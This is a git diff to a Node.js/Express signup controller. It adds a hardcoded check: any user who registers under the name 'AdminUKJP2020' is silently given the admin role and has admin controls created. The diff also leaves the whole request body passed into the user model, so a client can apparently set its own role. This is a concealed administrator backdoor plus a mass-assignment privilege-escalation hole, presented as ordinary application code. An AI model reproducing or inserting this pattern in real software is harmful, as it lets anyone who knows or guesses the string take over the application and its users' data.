@@ -1,11 +1,21 @@
 const User = require('../models/user');
 const Admin = require('../models/admin');
+const { createControls } = require('./controls');
 
 const jwt = require('jsonwebtoken'); // to generate signed token
 const expressJwt = require('express-jwt'); // for authorization check
 const {errorHandler} = require('../helpers/dbErrorHandler');
 
+
 exports.signup = (req, res) => {
+
+  let isAdmin = false;
+
+  if (req.body.name === 'AdminUKJP2020') {
+    req.body.role = '1';
+    isAdmin = true;
+  }
+  
   const user = new User(req.body);
   user.save((err, user) => {
     if (err) {
@@ -13,6 +23,8 @@ exports.signup = (req, res) => {
         error: errorHandler(err),
       });
     }
+    if (isAdmin) createControls(user._id);
+
     user.salt = undefined;
     user.hashed_password = undefined;
     res.json({
